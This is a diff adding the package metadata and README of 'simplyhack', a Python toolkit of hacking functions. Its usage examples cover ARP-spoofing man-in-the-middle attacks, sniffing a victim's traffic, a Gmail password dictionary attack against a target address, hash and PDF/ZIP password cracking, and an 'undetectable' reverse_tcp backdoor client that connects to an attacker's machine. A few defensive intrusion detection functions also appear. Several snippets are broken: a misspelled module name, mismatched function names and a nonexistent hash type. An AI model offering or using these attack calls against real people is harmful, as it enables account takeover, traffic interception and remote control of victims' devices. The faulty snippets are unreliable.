@@ -1,0 +1,355 @@
+Metadata-Version: 2.1
+Name: simplyhack
+Version: 0.0.10
+Summary: Simplyfing the process of creating cybersecurity tools
+Home-page: UNKNOWN
+Author: Abhishek Uday Dangat
+Author-email: abshdangat@gmail.com
+License: UNKNOWN
+Keywords: python,hacking,cybersecurity,hacking tools,security testing,hacker
+Platform: UNKNOWN
+Classifier: Development Status :: 1 - Planning
+Classifier: Intended Audience :: Developers
+Classifier: Programming Language :: Python :: 3
+Classifier: Operating System :: Unix
+Classifier: Operating System :: MacOS :: MacOS X
+Classifier: Operating System :: Microsoft :: Windows
+Description-Content-Type: text/markdown
+Requires-Dist: colorama
+Requires-Dist: pikepdf
+Requires-Dist: rarfile
+Requires-Dist: scapy
+Requires-Dist: scapy-http
+
+
+# SimplyHack
+
+SimplyHack is currently under construction and is not completly ready for use yet! You may encounter many bugs while using SimplyHack, so feel free to report those to me on my Instagram. Instagram - Abhishek Dangat - @abhishek0.deb.
+Currently experimenting and planning.
+
+Developed by - **Abhishek Dangat**
+
+## A guide on how to use
+
+**Installation**
+
+```sh
+sudo apt update && sudo apt install python3-pip
+pip3 install simplyhack
+```
+
+if this gives errors, try :-
+
+```sh
+sudo apt update && sudo apt install python3-pip
+pip3 install simplyhack==0.0.9
+```
+
+## [Reconnaissance]
+
+**Subdomain scanner**
+
+- domain = domain name of the target. eg: (domain="example.com")
+- protocol = The protocol of the specified domain name. eg: (protocol="http" OR protocol="https")
+- wordlist = The wordlist of subdomains for scanning. eg: (wordlist="default" OR wordlist="somewordlistfile.txt")
+
+> Note: You should specify only on of the options for protocol and wordlist. 
+> For protocol, either specify `protocol="http"` or specify `protocol="https"`. 
+> For wordlist, either specify `wordlist="default"` to use the default wordlist, but you have a wordlist of your own, specify `wordlist="wordlistname.txt"`
+
+```python
+import simplyhack
+# or use - from simplyhack import subdomain_scan
+
+# IF you want to use the default wordlist
+simplyhack.subdomain_scan(domain="example.com", protocol="http/https", wordlist="default")
+
+# OR if you want to specify your own wordlist
+simplyhack.subdomain_scan(domain="example.com", protocol="http/https", wordlist="wordlist.txt")
+```
+
+
+**Discover hidden directories**
+
+- domain = domain name of the target. eg: (domain="example.com")
+- wordlist = The wordlist of subdomains for scanning. eg: (wordlist="default" OR wordlist="somewordlistfile.txt")
+
+> Note: You should specify only on of the options for wordlist. 
+> Either specify `wordlist="default"` to use the default wordlist, or specify `wordlist="wordlistname.txt"` to use your own wordlist
+
+```python
+import simplyhack
+# or use - from simplyhack import directory_scan 
+
+# If you want to use the default wordlist
+simplyhack.directory_scan(domain="example.com", wordlist="default")
+
+# if you want to specify your own wordlist
+simplyhack.subdomain_scan(domain="example.com", protocol="http/https", wordlist="wordlist.txt")
+
+```
+
+**Web Spider**
+
+- url = The Domain name of the target. eg: (url="example.com")
+
+> Note: Do not include the protocol in the URL. ie. Use url="example.com" and not url="https://example.com"
+
+```python
+import simplyhack
+# or use - from simplyhack import web_spider
+
+simplyhack.web_spider(url="example.com")
+```
+
+
+**DNS Lookup**
+
+```python
+import simplyhack
+# or use - from simplyhack import dns_lookup
+
+simplyhack.dns_lookup(url="example.com")
+```
+
+
+**RDNS Lookup**
+
+```python
+import simplyhack
+# or use - from simplyhack import reverse_dns_lookup
+
+simplyhack.reverse_dns_lookup(ip="<target IPv4>")
+```
+
+
+**Local Network Scanning**
+
+- targetIP = The IPv4 address of the target machine. Either specify a single IPv4 (xxx.xxx.xxx.xxx) or use /24 to specify the entire network class (xxx.xxx.xxx.1/24)
+
+```python
+import simplyhack
+# or use - from simplyhack import local_scan
+
+# to scan only the specified ip
+simplyhack.local_scan(targetIP="xxx.xxx.xxx.xxx")
+
+# to scan the entire network
+simplyhack.local_scan(targetIP="xxx.xxx.xxx.1/24")
+```
+
+## [Network Attacks]
+
+**MITM (ARP Spoofing)**
+
+- routerIP = The IPv4 address of your router
+- targetIP = The IPv4 address of the victims device
+
+> Note: you can use the local scan functionality of simplyhack to get the IPv4 address of the victim's device and the router.
+
+```python
+import simplyhack
+# or use - from simplyhack import arp_spoof
+
+simplyhack.arp_spoof(routerIP="<router IPv4>", targetIP="<target IPv4>")
+```
+
+> Note: This will make your device the MITM and then you can run further attacks
+
+
+**MITM (Packet Sniffing)**
+
+- interface = Your current interface
+
+> Note: To successfully sniff packets of the victim's device, you first need to be the Man In The Middle. For this to happen, use the ARP Spoof functionality 1st and then run the packet sniffer
+
+```python
+import simplyhack
+# or use - from simplyhack import sniff_packets
+
+simplyhack.sniff_packets(interface="<your interface>")
+```
+
+> This currently works only on the sites using HTTP. I will soon release a version that will work for all other protocols as well.
+
+
+**Local Network Scanning**
+
+> Same as mentioned above
+
+
+**MAC Changer (Bypass network restrictions)**
+
+- interface = Your current network interface
+- new mac = The new mac address.
+- ischeck = To specify if you want to check if your devices MAC Address has changed or not.
+
+> Note: If you want a randomly generated MAC address as your new MAC, then specify rand, But if you want a specific new MAC address then specify the address xx:xx:xx:xx:xx:xx
+
+Check out the Wiki page of MAC Address for more information
+
+```python
+import simplyhack
+# or use - from simplyhack import change_mac_address
+
+# use rand to get a randomly generated MAC address or specify a new one
+# new_mac="rand" for random MAC
+# new_mac="xx:xx:xx:xx:xx:xx" for specific MAC
+
+# Set ischeck to either TRUE or FALSE.
+# ischeck="TRUE" will help you check if the MAC address is really changed
+# ischeck="FALSE" will exit the script without checking
+
+simplyhack.change_mac_address(interface="<Your Interface>", new_mac="rand OR <new MAC>", ischeck="TRUE/FALSE")
+```
+
+## [Defense]
+
+**Network Intrusion Detection System (IDS)**
+
+- Interface = Your current interface
+
+```python
+import simplyhack
+# or use - from simplyhack import network_ids
+
+simplyhack.network_ids(interface="<Your current interface>")
+```
+
+
+**Endpoint Intrusion Detection System (IDS)**
+
+```python
+import simplyhack
+# or use - from simplyhack import endpoint_ids
+
+simplyhack.endpoint_ids()
+```
+
+
+## [Password Cracking (Dictionary attacks/Bruteforce attacks)]
+
+**Hash cracking**
+
+- hash type = Type of the hash. available types: sha1, sha224, sha251, sha512, md5
+- passwordHash = The passwords in hashed format to crack
+- wordlist = wordlist of passwords
+
+> Note: you can use the default wordlist by specifying wordlist="default" or if you want to specify a wordlist of your own then you can specify it like wordlist="somewordlistfile.txt"
+
+```python
+import simplyhack
+# or use - from simplyhack import hash_crack
+
+# for default wordlist
+simplyhack.hash_crack(hash_type="sha1/sha224/sha256/sha512/md5", passwordHash="<Password Hash>", wordlist="default")
+
+# for specified wordlist
+simplyhack.hash_crack(hash_type="sha1/sha224/sha256/sha512/md5", passwordHash="<Password Hash>", wordlist="somewordlistfile.txt")
+```
+
+
+**Cracking a password protected file's password**
+
+- filetype = The extension of the file. Extensions currently available: (pdf, zip)
+- file path = The path of the file
+- wordlist = The password wordlist
+
+> Note: you can use the default wordlist by specifying wordlist="default" or if you want to specify a wordlist of your own then you can specify it like wordlist="somewordlistfile.txt"
+
+```python
+import simplyhack
+# or use - from simplyhack import crack_passprotected
+
+# for default wordlist
+simplyhack.crack_passprotected(filetype="<file type>", file_path="/xxx/xxx/xxx/file.zip/.pdf", wordlist="default")
+
+# for specified wordlist
+simplyhack.crack_passprotected(filetype="<file type>", file_path="/xxx/xxx/xxx/file.zip/.pdf", wordlist="somewordlistfile.txt")
+```
+
+
+**Gmail dictionary attack**
+
+- target gmail = The targets Gmail address
+- wordlist = The password wordlist
+
+> Note: you can use the default wordlist by specifying wordlist="default" or if you want to specify a wordlist of your own then you can specify it like wordlist="somewordlistfile.txt"
+
+```python
+import simplyhack
+# or use - from simplyhack import gmail_brute
+
+# for default wordlist
+simplyhack.gmail_dictatk(target_gmail="example@gmail.com", wordlist="default")
+
+# for specified wordlist
+simplyhack.gmail_dictatk(target_gmail="example@gmail.com", wordlist="wordlist.txt")
+```
+
+
+## [Vulerability Discovery]
+
+**Web Vulnerability Scanner**
+
+> Note: This scanner is currently under construction and is not completly ready to use.
+
+- domain = The target URL to scan.
+
+> Note: Do not include the protocol of the URL. ie. Use domain="example.com" and not domain="https://example.com"
+
+```python
+import simplyhack
+# or use - from simplyhack import web_vuln_scan
+
+simplyhack.web_vuln_scan(domain="example.com")
+```
+
+
+**Network Vulnerability Scanner**
+
+> Note: This scanner is currently under construction and is not completly ready to use.
+
+- ip = the IPv4 address of your target
+
+> Note: You can also specify your entire IP range. eg xxx.xxx.xxx.1/24
+
+```python
+import simplyhack
+# or use - from simplyhack import port_vulnscan
+
+simplyhack.port_vulnscan(ip="<Your target IP/IP range>")
+```
+
+
+## [Gaining Access]
+
+**Undetectable reverse_tcp connection Backdoor (Client)**
+
+- server ip = The IP address of the attackers maching
+- server port = The port number on which you have to listen for connections
+
+> Note: Do not use quotation while specifying the port number. ie. use xxxx and not "xxxx" to specify the port number
+
+```python
+import simplyhack
+# or use - from simplyhack import backdoor_client
+
+simplthack.backdoor_client(server_ip="<server IPv4>", server_port=<server port number>)
+```
+
+**reverse_tcp connection Server**
+
+- server ip = The IP address of the attackers maching
+- server port = The port number on which you have to listen for connections
+
+> Note: Do not use quotation while specifying the port number. ie. use xxxx and not "xxxx" to specify the port number
+
+```python
+import simplyhack
+# or use - from simplyhack import backdoor_server
+
+simplthack.backdoor_server(server_ip="<server IPv4>", server_port=<server port number>)
+```
+
+
